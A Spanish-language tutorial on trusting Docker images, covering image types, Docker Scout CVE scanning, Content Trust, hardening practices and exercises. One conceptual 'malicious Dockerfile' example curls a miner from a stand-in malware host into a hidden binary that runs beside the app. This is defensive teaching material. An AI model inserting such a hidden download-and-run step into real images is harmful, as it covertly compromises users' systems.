# T04 — Imágenes de confianza

## El riesgo de las imágenes

Una imagen Docker es **código ejecutable empaquetado**. Cuando ejecutas
`docker run some_image`, estás ejecutando código de un tercero con los permisos del
contenedor (por defecto root). Si la imagen contiene malware, se ejecuta en tu
sistema.

```
docker pull usuario_desconocido/app-util:latest
                        │
                        ▼
           ┌─────────────────────────┐
           │  ¿Qué hay dentro?      │
           │                        │
           │  ✓ La aplicación       │
           │  ? Crypto miner        │
           │  ? Backdoor            │
           │  ? CVEs sin parchear   │
           │  ? Credenciales        │
           │    hardcodeadas        │
           └─────────────────────────┘
```

## Tipos de imágenes en Docker Hub

### Imágenes oficiales (`library/`)

Mantenidas por Docker Inc. en colaboración con los autores del software. Se
identifican por no tener prefijo de usuario:

```bash
# Imágenes oficiales — sin prefijo
docker pull nginx          # library/nginx
docker pull postgres       # library/postgres
docker pull alpine         # library/alpine
docker pull python         # library/python
```

Características:
- Revisadas y escaneadas por Docker Inc.
- Documentación detallada con mejores prácticas
- Actualizaciones regulares de seguridad
- Dockerfiles públicos y auditables
- Variantes optimizadas (slim, alpine, bookworm)

### Imágenes verificadas (Verified Publisher)

De empresas que Docker ha verificado. Tienen un badge azul en Docker Hub:

```bash
# Imágenes de publishers verificados — con prefijo de organización
docker pull bitnami/postgresql
docker pull grafana/grafana
docker pull hashicorp/vault
```

### Imágenes community

Publicadas por cualquier usuario. **Sin garantía de calidad ni seguridad**:

```bash
# Imágenes community — usuario/imagen
docker pull random_user/some_tool
# ¿Quién es random_user? ¿El Dockerfile es público? ¿Cuándo se actualizó?
```

### Comparación

| Tipo | Confianza | Actualizaciones | Auditoría | Ejemplo |
|---|---|---|---|---|
| Oficial | Alta | Regulares | Docker Inc. | `nginx`, `postgres` |
| Verified | Media-Alta | Depende del publisher | Publisher verificado | `bitnami/redis` |
| Community | Variable | Sin garantía | Ninguna | `user123/tool` |

## Riesgos concretos de imágenes no confiables

### Malware embebido

Una imagen puede contener un crypto miner, un reverse shell, o un exfiltrador de
datos que se ejecuta silenciosamente junto con la aplicación legítima:

```dockerfile
# Dockerfile malicioso (ejemplo conceptual)
FROM node:20
COPY app/ /app/
# Carga útil oculta en una capa intermedia
RUN curl -s https://malware.example.com/miner -o /usr/local/bin/.svc && \
    chmod +x /usr/local/bin/.svc
CMD ["/bin/sh", "-c", "/usr/local/bin/.svc & node /app/index.js"]
```

El miner corre en background mientras la aplicación funciona normalmente. Sin
monitoreo, no se detecta.

### Dependencias con vulnerabilidades (CVEs)

Imágenes con librerías desactualizadas contienen vulnerabilidades conocidas:

```bash
# Una imagen basada en una versión antigua puede tener cientos de CVEs
docker scout cves node:16
# CVE-2023-XXXX (CRITICAL): OpenSSL buffer overflow
# CVE-2023-YYYY (HIGH): libcurl HSTS bypass
# ... 150+ vulnerabilidades
```

### Bases abandonadas

Imágenes que ya no se mantienen y no reciben parches:

```bash
# ¿Cuándo se actualizó esta imagen por última vez?
docker inspect --format '{{.Created}}' some_image:latest
# 2021-03-15T... — hace años, todas las dependencias están desactualizadas
```

## Docker Scout — Escaneo de vulnerabilidades

Docker Scout (anteriormente `docker scan`) analiza las capas de una imagen y
compara las dependencias contra bases de datos de CVEs:

```bash
# Escaneo rápido — resumen
docker scout quickview nginx:latest
# Target: nginx:latest
# digest: sha256:abc123...
#
#   Critical    0
#   High        2
#   Medium      5
#   Low         12
#   Unspecified 3

# Listar CVEs detalladamente
docker scout cves nginx:latest
# CVE-2024-XXXX  HIGH   libcurl 7.88.1 → fix in 7.88.2
# CVE-2024-YYYY  MEDIUM openssl 3.0.9  → fix in 3.0.10
# ...

# Comparar dos versiones
docker scout compare nginx:1.24 --to nginx:1.25
# Muestra CVEs resueltas y nuevas entre versiones
```

### Interpretar los resultados

No todas las CVEs requieren acción inmediata:

```
CRITICAL → Parchear inmediatamente. Explotable remotamente sin autenticación
HIGH     → Parchear pronto. Explotable pero requiere condiciones específicas
MEDIUM   → Evaluar. Puede no aplicar a tu caso de uso
LOW      → Monitorear. Riesgo bajo
```

**Falsos positivos**: una CVE en OpenSSL puede no afectarte si tu aplicación no
usa las funciones vulnerables. Evalúa si la CVE es **explotable en tu contexto**
antes de actuar.

## Docker Content Trust (DCT)

DCT verifica que las imágenes estén **firmadas** por su publicador. Cuando está
activo, Docker rechaza imágenes sin firma válida:

```bash
# Activar Content Trust
export DOCKER_CONTENT_TRUST=1

# Pull de una imagen firmada — funciona
docker pull nginx:latest
# Pull (1 of 1): nginx:latest@sha256:...
# Tagging nginx:latest@sha256:... as nginx:latest

# Pull de una imagen sin firmar — falla
docker pull random_user/unsigned_image:latest
# Error: remote trust data does not exist
# No valid trust data for latest
```

```bash
# Verificar si una imagen está firmada
docker trust inspect nginx
# Signers:
#   - docker-library  (key: abc123...)
# Administrative keys:
#   - Repository Key: def456...
```

**Impacto**: DCT bloquea imágenes community no firmadas. Si dependes de ellas,
no puedes activar DCT globalmente. Puede activarse selectivamente por repositorio.

## Buenas prácticas

### 1. Usar imágenes oficiales como base

```dockerfile
# Bien: imagen oficial, versión específica
FROM python:3.12-slim-bookworm

# Evitar: imagen community de origen desconocido
# FROM random_user/python-custom:latest
```

### 2. Especificar versiones exactas (nunca `latest`)

```bash
# Mal: latest puede cambiar en cualquier momento
docker pull nginx:latest

# Bien: versión específica
docker pull nginx:1.25.4

# Mejor: digest (inmutable)
docker pull nginx@sha256:abc123def456...
```

La etiqueta `latest` no significa "la más reciente" — es simplemente la etiqueta
por defecto. El mantenedor puede apuntar `latest` a cualquier versión, y puede
cambiar sin aviso.

### 3. Escanear regularmente

```bash
# Integrar en CI/CD
docker scout cves myimage:v1.2.3 --exit-code --only-severity critical,high
# Exit code != 0 si hay CVEs critical o high → rompe el pipeline
```

### 4. Reconstruir periódicamente

Las dependencias de la imagen base se parchean continuamente. Reconstruir la
imagen incorpora los parches más recientes:

```bash
# Reconstruir sin caché para obtener las dependencias más recientes
docker build --no-cache -t myapp:v1.2.3 .

# Programar rebuilds semanales en CI/CD
```

### 5. Minimizar la superficie de ataque

```dockerfile
# Usar imágenes mínimas
FROM python:3.12-slim-bookworm  # En lugar de python:3.12 (full)

# Mejor aún: multi-stage build
FROM python:3.12 AS builder
COPY requirements.txt .
RUN pip install --target=/install -r requirements.txt

FROM python:3.12-slim-bookworm
COPY --from=builder /install /usr/local/lib/python3.12/site-packages
COPY app/ /app/
USER appuser
CMD ["python", "/app/main.py"]
```

Menos paquetes = menos CVEs potenciales = menor superficie de ataque.

### 6. Verificar el Dockerfile

Antes de usar una imagen community, verifica que el Dockerfile esté disponible:

```
Docker Hub → imagen → "Dockerfile" tab
GitHub → repositorio del mantenedor → Dockerfile

Si no hay Dockerfile público → no confíes en la imagen
```

## Tabla resumen de herramientas de seguridad

| Herramienta | Qué hace | Cuándo usarla |
|---|---|---|
| `docker scout cves` | Escanea CVEs en dependencias | Antes de deploy, en CI/CD |
| `docker scout quickview` | Resumen rápido de seguridad | Evaluación rápida |
| `docker trust inspect` | Verifica firmas de imágenes | Validar origen |
| `DOCKER_CONTENT_TRUST=1` | Rechaza imágenes sin firmar | Entornos restringidos |
| `docker history` | Ver capas y comandos de la imagen | Auditar qué se instaló |
| `docker inspect` | Metadata completa de la imagen | Verificar USER, EXPOSE, etc. |

---

## Ejercicios

### Ejercicio 1 — Escanear vulnerabilidades

```bash
# Escanear una imagen reciente
docker scout quickview alpine:latest

# Escanear una imagen más antigua y comparar
docker scout quickview node:16
# Comparar la cantidad de CVEs

# Ver detalles de las CVEs critical/high
docker scout cves node:16 --only-severity critical,high 2>&1 | head -30
```

### Ejercicio 2 — Comparar imágenes full vs slim

```bash
# Descargar variantes de la misma imagen
docker pull python:3.12
docker pull python:3.12-slim

# Comparar tamaño
docker image ls python --format "{{.Repository}}:{{.Tag}}\t{{.Size}}"

# Comparar vulnerabilidades
docker scout quickview python:3.12
docker scout quickview python:3.12-slim
# La versión slim tiene significativamente menos CVEs
```

### Ejercicio 3 — Auditar una imagen con `docker history`

```bash
# Ver los comandos que construyeron la imagen
docker history nginx:latest --no-trunc --format "{{.CreatedBy}}" | head -15

# Verificar si la imagen define un USER non-root
docker inspect --format '{{.Config.User}}' nginx:latest
# "" (vacío) → corre como root por defecto (pero nginx hace drop de privilegios internamente)

docker inspect --format '{{.Config.User}}' postgres:16
# "" → root al inicio, pero el entrypoint cambia a postgres
```

### Ejercicio 4 — Docker Content Trust

```bash
# Activar Content Trust
export DOCKER_CONTENT_TRUST=1

# Pull de imagen oficial firmada
docker pull alpine:latest
# Funciona — imagen firmada

# Desactivar para continuar con el laboratorio
unset DOCKER_CONTENT_TRUST
```
